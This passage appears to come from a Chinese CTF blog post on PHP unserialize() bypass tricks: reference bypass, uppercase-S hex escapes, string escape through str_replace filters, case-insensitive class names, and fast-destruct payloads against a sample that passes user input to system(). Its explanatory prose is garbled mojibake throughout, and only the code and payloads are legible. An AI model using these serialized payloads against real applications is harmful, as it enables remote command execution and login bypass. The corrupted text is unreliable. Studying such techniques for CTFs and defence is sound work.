<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="å¼•ç”¨ç»•è¿‡"><a href="#å¼•ç”¨ç»•è¿‡" class="headerlink" title="å¼•ç”¨ç»•è¿‡"></a>å¼•ç”¨ç»•è¿‡</h2><p>åˆ©ç”¨æ–¹å¼ï¼šå½“ä»£ç ä¸­å­˜åœ¨ç±»ä¼¼<code>$this-&gt;a===$this-&gt;b</code>çš„æ¯”è¾ƒæ—¶å¯ä»¥ç”¨<code>&amp;</code>ï¼Œä½¿<code>$a</code>æ°¸è¿œä¸<code>$b</code>ç›¸ç­‰</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>$this-&gt;b = &amp;$this-&gt;a;</code>è¡¨ç¤º<code>$b</code>å˜é‡æŒ‡å‘çš„åœ°å€æ°¸è¿œæŒ‡å‘<code>$a</code>å˜é‡æŒ‡å‘çš„åœ°å€</p>
<h2 id="16è¿›åˆ¶ç»•è¿‡"><a href="#16è¿›åˆ¶ç»•è¿‡" class="headerlink" title="16è¿›åˆ¶ç»•è¿‡"></a>16è¿›åˆ¶ç»•è¿‡</h2><p>åˆ©ç”¨æ–¹å¼ï¼šå½“ä»£ç ä¸­å­˜åœ¨å…³é”®è¯æ£€æµ‹æ—¶ï¼Œå°†è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„<code>s</code>æ”¹ä¸ºå¤§å†™æ¥ç»•è¿‡æ£€æµ‹</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¦‚æœè¿‡æ»¤äº†å…³é”®å­—<code>admin</code>ï¼Œå¯ä»¥å°†å…¶æ›¿æ¢æˆ<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p>
<p>è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„sä¸ºå¤§å†™æ—¶ï¼Œå°±ä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æ</p>
<h2 id="å­—ç¬¦é€ƒé€¸"><a href="#å­—ç¬¦é€ƒé€¸" class="headerlink" title="å­—ç¬¦é€ƒé€¸"></a>å­—ç¬¦é€ƒé€¸</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p>ç”±äº<code>php</code>åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œæ˜¯ä»å·¦åˆ°å³è¯»å–ï¼Œè¯»å–å¤šå°‘å–å†³äº<code>s</code>åé¢çš„å­—ç¬¦é•¿åº¦ï¼Œä¸”è®¤ä¸ºè¯»åˆ°<code>&#125;</code>å°±ç»“æŸäº†ï¼Œ<code>&#125;</code>åé¢çš„å­—ç¬¦ä¸ä¼šæœ‰å½±å“</p>
<p>ä¸€èˆ¬è§¦å‘å­—ç¬¦é€ƒé€¸çš„æ¡ä»¶æ˜¯æ›¿æ¢å‡½æ•°<code>str_replace</code>ï¼Œä½¿å­—ç¬¦ä¸²é•¿åº¦æ”¹å˜ï¼Œé€ æˆå­—ç¬¦é€ƒé€¸ï¼Œè¯»å–åˆ°ä¸ä¸€æ ·çš„æ•°æ®</p>
<h3 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å¤š"></a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ç»“æœä¸­çš„<code>aaa</code>è¢«æ›¿æ¢æˆäº†<code>aaaa</code>ï¼Œä½†æ˜¯é•¿åº¦å€¼æ²¡å˜ï¼Œè¿˜æ˜¯<code>3</code>ï¼Œè¿™å°±å¯¼è‡´å¤šå‡ºäº†ä¸€ä¸ª<code>a</code>ï¼Œè€Œä¸”å€¼æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™éƒ¨åˆ†å€¼å˜ä¸º <code>å¾ˆå¤šaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>ï¼Œ <code>å¾ˆå¤šaaa</code>çš„å…·ä½“ä¸ªæ•°å–å†³äºåé¢æƒ³è¦æ„é€ çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™é‡Œæ˜¯<code>21</code>ä½ï¼Œå°±ç”¨<code>21</code>ç»„<code>aaa</code>ï¼Œè¿™æ ·æ›¿æ¢åä¼šå¤šå‡º<code>21</code>ä¸ªå­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>$b</code>çš„å€¼æˆåŠŸè¢«ä¿®æ”¹æˆäº†<code>qaq</code></p>
<h3 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h3><p>åŸç†ä¸<code>è¿‡æ»¤åå­—ç¬¦å˜å¤š</code>å¤§åŒå°å¼‚ï¼Œå°±æ˜¯å‰é¢å°‘äº†ï¼Œå¯¼è‡´åé¢çš„å­—ç¬¦è¢«åƒæ‰ï¼Œä»è€Œæ‰§è¡Œäº†æˆ‘ä»¬åé¢çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸»è¦æ³¨æ„é—­åˆå°±è¡Œäº†ï¼Œä¸sqlæ³¨å…¥ç±»ä¼¼</p>
<h2 id="ç±»å±æ€§ä¸æ•æ„Ÿ"><a href="#ç±»å±æ€§ä¸æ•æ„Ÿ" class="headerlink" title="ç±»å±æ€§ä¸æ•æ„Ÿ"></a>ç±»å±æ€§ä¸æ•æ„Ÿ</h2><p>å¯¹äº<code>PHP</code>ç‰ˆæœ¬<code>7.1+</code>ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>	&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure>

<p>ä»¤<code>public</code>æ—¶å¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œåœ¨<code>priviate</code>æˆ–è€…<code>protected</code>ä¿®é¥°çš„æ—¶å€™ååºåˆ—åŒ–ï¼Œ<code>hello</code>å±æ€§éƒ½èƒ½è·å¾—å€¼</p>
<h2 id="ç±»åå’Œæ–¹æ³•åä¸åŒºåˆ†å¤§å°å†™"><a href="#ç±»åå’Œæ–¹æ³•åä¸åŒºåˆ†å¤§å°å†™" class="headerlink" title="ç±»åå’Œæ–¹æ³•åä¸åŒºåˆ†å¤§å°å†™"></a>ç±»åå’Œæ–¹æ³•åä¸åŒºåˆ†å¤§å°å†™</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">PHPç‰¹æ€§ï¼š<br>å˜é‡ååŒºåˆ†å¤§å°å†™<br>å¸¸é‡ååŒºåˆ†å¤§å°å†™<br>æ•°ç»„ç´¢å¼• (é”®å) åŒºåˆ†å¤§å°å†™<br>å‡½æ•°å, æ–¹æ³•å, ç±»åä¸åŒºåˆ†å¤§å°å†™<br>é­”æœ¯å¸¸é‡ä¸åŒºåˆ†å¤§å°å†™ (ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´å’Œç»“å°¾çš„å¸¸é‡)<br>NULL TRUE FALSE ä¸åŒºåˆ†å¤§å°å†™<br>å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸åŒºåˆ†å¤§å°å†™ (åœ¨å˜é‡å‰é¢åŠ ä¸Š (type))<br></code></pre></td></tr></table></figure>

<p>å¸¸è§ç”¨æ¥ç»•è¿‡æ­£åˆ™</p>
<p>å¦‚ctfshowçš„ä¸€é“é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-04 23:52:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><blockquote>
<p>é€šå¸¸å‘åºåˆ—åŒ–çš„å…¥å£åœ¨__destruct()æ–¹æ³•ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–æ“ä½œä¹‹åæŠ›å‡ºäº†å¼‚å¸¸åˆ™ä¼šè·³è¿‡__destruct()å‡½æ•°çš„æ‰§è¡Œã€‚</p>
</blockquote>
<p>ä¾‹å¦‚è¿™æ ·ä¸€é“é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;NoNoNo&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–æ“ä½œæ‰§è¡Œä¹‹åå¹¶æ²¡æœ‰ç«‹å³æ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ä¸­çš„å†…å®¹ï¼Œè€Œæ˜¯æŠ›å‡ºäº†å¼‚å¸¸å¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«è·³è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹åºåˆ—åŒ–å¾—åˆ°çš„å­—ç¬¦ä¸²ä½¿å¾—ååºåˆ—åŒ–è§£æå‡ºé”™ï¼Œå¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«æå‰æ‰§è¡Œã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åº”è¯¥æ˜¯ï¼š</p>
<p><code>O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å»æ‰ä¸€ä¸ªå¤§æ‹¬å·</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<br><br><span class="hljs-comment">//ç»“å°¾åŠ å…¥å¤šä½™æ•°æ®</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">123</span>a&#125;<br></code></pre></td></tr></table></figure>


<h2 id="serialize-unserialize-x-x3D-x"><a href="#serialize-unserialize-x-x3D-x" class="headerlink" title="serialize(unserialize($x)) !&#x3D; $x"></a>serialize(unserialize($x)) !&#x3D; $x</h2><p>æ­£å¸¸æ¥è¯´ä¸€ä¸ªåˆæ³•çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹åå†æ¬¡åºåˆ—åŒ–æ‰€å¾—åˆ°çš„ç»“æœåº”æ˜¯ä¸€è‡´çš„</p>
<p><img src="/img/summary/php_unserialize-14.png"></p>
<p>è™½ç„¶åœ¨ä¾‹å­ä¸­æ²¡æœ‰AAAè¿™ä¸ªç±»ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ– åºåˆ—åŒ–è¿‡åå¾—åˆ°çš„å€¼ä¾ç„¶ä¸ºåŸæ¥çš„å€¼</p>
<p>var_dumpçš„ç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class AAA&#123;</span><br><span class="hljs-comment">//    public $a = &#x27;1&#x27;;</span><br><span class="hljs-comment">//    public $b = &#x27;2&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(AAA)<span class="hljs-comment">#1 (2) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(<span class="hljs-built_in">__PHP_Incomplete_Class</span>)<span class="hljs-comment">#1 (3) &#123;</span><br>  [<span class="hljs-string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;AAA&quot;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>var_dumpåå¯ä»¥å‘ç°ä»¥ä¸‹å·®å¼‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">1ï¼šæ‰€å±ç±»åç§°<br>å¯¹è±¡æ‰€å±ç±»çš„åç§°ç”± AAA å˜ä¸ºäº† __PHP__Incomplete_Class<br><br>2ï¼š__PHP_Incomplete_Class_Name å±æ€§<br>__PHP_Incomplete_Class å¯¹è±¡ä¸­å¤šåŒ…å«äº†ä¸€ä¸ª __PHP_Incomplete_Class_Name å±æ€§<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥PHPåœ¨é‡åˆ°ä¸å­˜åœ¨çš„ç±»æ—¶ï¼Œä¼šæŠŠä¸å­˜åœ¨çš„ç±»è½¬æ¢æˆ __PHP_Incomplete_Class è¿™ç§ç‰¹æ®Šçš„ç±»ï¼Œå¹¶ä¸”å°†åŸå§‹çš„ç±»åå­˜æ”¾åœ¨ __PHP_Incomplete_Class_Name è¿™ä¸ªå±æ€§ä¸­ã€‚è€Œ serialize() åœ¨å¤„ç†çš„æ—¶å€™ä¼šå€’æ¨å›æ¥ï¼Œå‘ç°å¯¹è±¡æ˜¯ __PHP_Incomplete_Class åï¼Œä¼šåºåˆ—åŒ–æˆ __PHP_Incomplete_Class_Name çš„å€¼ä¸ºç±»åçš„ç±»ï¼Œ<strong>åŒæ—¶å°† __PHP_Incomplete_Class_Name åˆ é™¤ï¼ˆå±æ€§ä¸ªæ•°å‡ä¸€ï¼‰</strong></p>
